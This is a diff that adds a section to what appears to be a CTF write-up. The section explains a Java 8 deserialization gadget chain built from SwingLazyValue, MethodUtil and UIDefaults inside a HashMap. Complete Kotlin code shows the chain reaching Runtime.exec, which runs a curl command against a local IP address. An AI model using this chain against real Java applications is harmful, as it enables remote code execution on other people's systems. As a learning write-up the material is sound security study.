@@ -129,7 +129,181 @@ As seen above, now we know how to create Gadget chain , next step is to find whi
 1. Entire JAVA JDK
 2. Classe's in classpath's included while running app (libraries, jar files etc.)
 
-The application above uses quite few libraries and JDK version 1.8(also known as [JDK 8](https://github.com/frohoff/jdk8u-jdk/))
+The application above uses quite few libraries and JDK version 1.8(also known as [JDK 8](https://github.com/frohoff/jdk8u-jdk/)) So our goal would be to find Gadget chain in them to achieve RCE.
+
+Here's the Gadget chain we will be using to attack 
+
+```kotlin
+
+import sun.reflect.misc.MethodUtil // part of JDK 1.8
+import java.lang.reflect.Method
+
+
+private fun createGadget(): Any {
+
+    // reflection API uses slot to tell which function to call
+    var invokeSlot = 6
+    var execSlot = 17
+
+    val invokeMethod = MethodUtil::class.java.getMethod(
+        "invoke",
+        Method::class.java, Any::class.java, emptyArray<Any>().javaClass
+    ).also { Reflect.on(it).set("slot", invokeSlot) }
+
+    val execMethod = Runtime::class.java.getMethod(
+        "exec",
+        String::class.java
+    ).also { Reflect.on(it).set("slot", execSlot) }
+
+
+    val cmd = "curl http://192.168.29.80:1235"
+    val args = arrayOf<Any>(execMethod, Runtime.getRuntime() as Any, arrayOf<Any>(cmd))
+
+    val value = SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", arrayOf(invokeMethod, Any(), args)) 
+    // https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/sun/swing/SwingLazyValue.java#L57  signature of SwingLazyValue
+
+
+    
+    val u1 = UIDefaults().apply { put("_", value) }
+    val u2 = UIDefaults().apply { put("_", value) } 
+    
+    val hashMap = HashMap<Any, Any>()
+    val rNode = Reflect.onClass("java.util.HashMap\$Node")
+
+    val array = java.lang.reflect.Array.newInstance(rNode.get(), 2) // create Array of size 2 of type rnode(java.util.HashMap$Node)
+    java.lang.reflect.Array.set(array, 0, rNode.create(0, u1, null, null).get()) // set 0th index ,
+    java.lang.reflect.Array.set(array, 1, rNode.create(0, u2, null, null).get())// set 1st index
+    Reflect.on(hashMap).set("size", 2).set("table", array)
+    
+    return hashMap
+}
+```
+
+Lets decouple the chain shall we:
+
+1. Part 1: getting the methods to execute
+
+We will be using reflection in kotlin to get methods
+
+![howreflection-kotlin](/website/assets/images/0ctf-2.png)
+
+```kotlin
+
+val invokeMethod = MethodUtil::class.java.getMethod(
+    "invoke",
+    Method::class.java, Any::class.java, emptyArray<Any>().javaClass
+).also { Reflect.on(it).set("slot", invokeSlot) }
+
+// MethodUtil::class -> getting the runtime reference to a statically/known class
+//      .java is same as using getClass() on object to get the class info
+//      .getMethod("methodname", signature) is java reflection API to get the method 
+
+// signature of MethodUtil.invoke method :
+//      public static Object invoke(Method m, Object obj, Object[] params)
+
+
+val execMethod = Runtime::class.java.getMethod(
+    "exec",
+    String::class.java
+).also { Reflect.on(it).set("slot", execSlot) }
+
+// same as Runtime.getClass().getMethod("exec", signature)
+```
+
+
+2. Setting up command executing function
+
+Our goal is to call `SwingLazyValue.createValue` since it has the following code:
+
+![rce-swingvalue](/website/assets/images/0ctf-1.png)
+
+It takes classname, methodname and string array and execute `m.invoke(c, args);` on it. So, here we want m to be equal to `Runtime.exec` and args to be the cmd to execute
+
+```kotlin
+val cmd = "curl http://192.168.29.80:1235"
+val args = arrayOf<Any>(execMethod, Runtime.getRuntime() as Any, arrayOf<Any>(cmd))
+
+val value = SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", arrayOf(invokeMethod, Any(), args)) 
+
+```
+
+The above is same as
+```
+c = SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", [Method::Runtime.exec, Runtime.getRuntime(), ["curl site.com"]]);
+```
+
+Like in the pic above, now if we do `c.createValue`, we will get command execution from the line `m.invoke(c, args);` (m here is Methodutil, c is "invoke" and args is the array)
+
+3. setting up chain to reach the reach the `SwingLazyValue.createValue` function
+
+![rce-swingvalue-chain](/website/assets/images/0ctf-3.png)
+
+Here we can see, the `getFromHashTable` function of `UIDefaults` class, calls `super.get(key)` on a hashtable entry and if the value is LazyValue(i.e Object), it just calls `Object.createValue` on it, and that what we wanted, soo,
+
+```kotlin
+val u2 = UIDefaults().also { it.put("_", SwingLazyValue(...)) } 
+```
+
+Now if in code there is a call to `u2.getFromHashtable("_")`, it will call `(SwingLazyValue).createValue(this);` and we will get RCE. So we need a way to now call `u2.getFromHashtable`. Actually the function `getFromHashtable` is called by `.get` function of `UIDefaults`
+
+![rce-swingvalue-chain](/website/assets/images/0ctf-5.png)
+
+We need to find a way to call `UIDefaults.get("_")`. Now this definately looks achievable. Actually, if we wrap `UIDefaults` object around `HashMap`, when a `HashMap` is deserialized, it calls `.get` on each `key` to check if key already exist in map or not. So now we just have to wrap the `UIDefaults` Object around HashMap and it will call following
+
+![rce-swingvalue-chain](/website/assets/images/0ctf-4.png)
+
+The `putval` function calls `key.equals(k)` (here key is Object of class UIDefaults):
+
+![rce-swingvalue-chain](/website/assets/images/0ctf-6.png)
+
+
+The `UIDefaults` class doesnt itself have `equals` function but since it extends `HashTable`, we can find the `equals` function inside `HashTable` as below
+
+![rce-swingvalue-chain](/website/assets/images/0ctf-8.png)
+
+And we can see it calls `.get` on the key (ie UIDefaults). So chain looks like
+
+```
+{
+    UIDefaults::Object : SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", [Method::Runtime.exec, Runtime.getRuntime(), ["curl site.com"]]),
+
+    UIDefaults::Object : SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", [Method::Runtime.exec, Runtime.getRuntime(), ["curl site.com"]]),
+}
+```
+
+SUMMARY: When the hashmap is deserialized, 
+1. it will call `putVal(key, val)` 
+
+    IMP: key here is `UIDefaults` object
+
+    since we have 2 keys, it will call putval for 1st key and then 2nd key. while doing it for 2nd key, since the hashmap is not empty, it will check if the key aready exist or not by calling `key.equals(key2)` 
+
+2. `key.equals(k2)` call `equals` method of `Hashtable` class which also exist in `Uidefault` class since it extends `Hashtable`. The `Hashtable` or `Uidefaults.equals()` calls `Uidefaults.get("_")` 
+
+3. `UiDefaults.get` calls `getFromHashtable` function on the value of `UiDefaults.get("_")` which is  SwingLazyValue payload and thus gives us RCE.
+
+Putting it all together in code:
+
+```kotlin
+val u1 = UIDefaults().also { it.put("_", value) }
+val u2 = UIDefaults().also { it.put("_", value) } 
+
+val hashMap = HashMap<Any, Any>()
+val rNode = Reflect.onClass("java.util.HashMap\$Node")
+
+val array = java.lang.reflect.Array.newInstance(rNode.get(), 2) // create Array of size 2 of type rnode(java.util.HashMap$Node)
+
+java.lang.reflect.Array.set(array, 0, rNode.create(0, u1, null, null).get()) // set 0th index ,
+java.lang.reflect.Array.set(array, 1, rNode.create(0, u2, null, null).get())// set 1st index
+
+// signature public static void set(Object array, int index, Object value)
+
+Reflect.on(hashMap).set("size", 2).set("table", array)
+
+return hashMap
+```
+
+This would be the complete chain. The hashMap object now obtained, if we call `hashMap.readObj()` on it, the deserialization chain will start and we should get RCE.
 
 
 ## 3rm1
